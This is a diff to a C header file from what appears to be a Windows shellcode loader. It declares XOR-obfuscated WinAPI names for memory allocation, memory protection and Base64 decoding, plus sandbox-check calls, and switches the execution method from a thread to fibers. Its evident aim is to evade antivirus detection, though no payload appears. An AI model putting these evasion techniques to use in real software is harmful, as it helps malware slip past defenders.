@@ -28,8 +28,10 @@ BOOL (WINAPI * _GetCursorPos)(LPPOINT lpPoint);
 BOOL (WINAPI * _CryptStringToBinaryA)(LPCSTR pszString, DWORD  cchString, DWORD  dwFlags, BYTE   *pbBinary, DWORD  *pcbBinary, DWORD  *pdwSkip, DWORD  *pdwFlags);
 LPVOID (WINAPI * _VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
 BOOL (WINAPI * _VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
-HANDLE (WINAPI * _CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE  lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
-DWORD (WINAPI * _WaitForSingleObject)(HANDLE hHandle, DWORD  dwMilliseconds);
+LPVOID (WINAPI * _ConvertThreadToFiber)(LPVOID lpParameter);
+LPVOID (WINAPI * _CreateFiber)(SIZE_T dwStackSize, LPFIBER_START_ROUTINE lpStartAddress, LPVOID lpParameter);
+void (WINAPI * _SwitchToFiber)(LPVOID lpFiber);
+
 
 /// Typedefs
 typedef BOOL (__stdcall * __type_gettickcount)();
@@ -40,8 +42,10 @@ typedef BOOL (__stdcall * __type_getcursorpos)(LPPOINT lpPoint);
 typedef BOOL (__stdcall * __type_cryptstringtobinarya)(LPCSTR pszString, DWORD  cchString, DWORD  dwFlags, BYTE   *pbBinary, DWORD  *pcbBinary, DWORD  *pdwSkip, DWORD  *pdwFlags);
 typedef LPVOID (__stdcall * __type_virtualalloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
 typedef BOOL (__stdcall * __type_virtualprotect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
-typedef HANDLE (__stdcall * __type_createthread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE  lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
-typedef DWORD (__stdcall * __type_waitforsingleobject)(HANDLE hHandle, DWORD  dwMilliseconds);
+typedef LPVOID (__stdcall * __type_convertthreadtofiber)(LPVOID lpParameter);
+typedef LPVOID (__stdcall * __type_createfiber)(SIZE_T dwStackSize, LPFIBER_START_ROUTINE lpStartAddress, LPVOID lpParameter);
+typedef void (__stdcall * __type_switchtofiber)(LPVOID lpFiber);
+
 
 /// Encrypted WinAPI function names
 /// Use xor_func_name() function from `scripts/obfuscator.py`
@@ -53,5 +57,6 @@ unsigned char __getcursorpos[] = {0x06, 0x27, 0x37, 0x07, 0x30, 0x34, 0x34, 0x27
 unsigned char __cryptstringtobinarya[] = {0x02, 0x30, 0x3a, 0x34, 0x31, 0x15, 0x33, 0x3a, 0x20, 0x24, 0x2c, 0x18, 0x22, 0x0c, 0x26, 0x3e, 0x30, 0x20, 0x2a, 0x15, 0x00 };
 unsigned char __virtualalloc[] = {0x17, 0x2b, 0x31, 0x30, 0x30, 0x27, 0x2b, 0x09, 0x25, 0x26, 0x24, 0x2f, 0x00 };
 unsigned char __virtualprotect[] = {0x17, 0x2b, 0x31, 0x30, 0x30, 0x27, 0x2b, 0x18, 0x3b, 0x25, 0x3f, 0x29, 0x2e, 0x3a, 0x00 };
-unsigned char __createthread[] = {0x02, 0x30, 0x26, 0x25, 0x31, 0x23, 0x13, 0x20, 0x3b, 0x2f, 0x2a, 0x28, 0x00 };
-unsigned char __waitforsingleobject[] = {0x16, 0x23, 0x2a, 0x30, 0x03, 0x29, 0x35, 0x1b, 0x20, 0x24, 0x2c, 0x20, 0x28, 0x01, 0x2d, 0x3a, 0x34, 0x31, 0x27, 0x00 };
+unsigned char __convertthreadtofiber[] = {0x02, 0x2d, 0x2d, 0x32, 0x20, 0x34, 0x33, 0x1c, 0x21, 0x38, 0x2e, 0x2d, 0x29, 0x1a, 0x20, 0x16, 0x38, 0x30, 0x36, 0x26, 0x00 };
+unsigned char __createfiber[] = {0x02, 0x30, 0x26, 0x25, 0x31, 0x23, 0x01, 0x21, 0x2b, 0x2f, 0x39, 0x00 };
+unsigned char __switchtofiber[] = {0x12, 0x35, 0x2a, 0x30, 0x26, 0x2e, 0x13, 0x27, 0x0f, 0x23, 0x29, 0x29, 0x3f, 0x00 };
